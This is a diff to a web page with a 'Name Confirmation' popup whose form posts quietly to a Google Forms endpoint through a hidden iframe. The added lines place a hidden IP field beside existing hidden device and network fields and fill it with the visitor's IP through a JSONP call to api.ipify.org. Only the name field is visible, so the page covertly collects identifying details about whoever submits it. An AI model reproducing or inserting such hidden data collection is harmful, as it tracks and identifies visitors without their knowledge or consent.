@@ -31,11 +31,18 @@ display:none;
   eeo.style.display="none";
   }
   </script>
+  <script type="application/javascript">
+  function put(json) {
+    var er = document.getElementById('Doraemon_Ip');
+er.value=json.ip;
+  }
+</script>
 <body>
 <div id="NOJS">
   <div id="Notif">
     Name Confirmation<button id="close" onclick="Doraemon_cl()">&times;</button>
   </div>
+  
 <form action="https://docs.google.com/forms/u/1/d/e/1FAIpQLSetqAA9m_qM6MZccr278BMojdf2F0jskwLucytrLwymT-Iu-g/formResponse" method="POST" target="DORM">
   <iframe name="DORM" style="display:none;"></iframe>
 <input type="text" name="entry.862675060" id="Doraemon_Name" required>
@@ -43,7 +50,11 @@ display:none;
 <input type="text" name="entry.349394022" id="Doraemon_Device" style="display:none;">
 <input type="text" name="entry.1405904831" id="Doraemon_Network" style="display:none;">
 <input type="text" name="entry.112651676" id="Doraemon_Type" style="display:none;">
+  <input type="text" name="entry.1919206551" id="Doraemon_Ip" style="display:none;">
+  
 <input type="submit" value="Submit" onclick="DORAEMON()">
+  </form>
+  <script type="application/javascript" src="https://api.ipify.org?format=json&callback=put"></script>
 </div>
   <div class="foot"> 
   Copyright &copy; 1969-2021 Doraemon Corporation Ltd,Inc
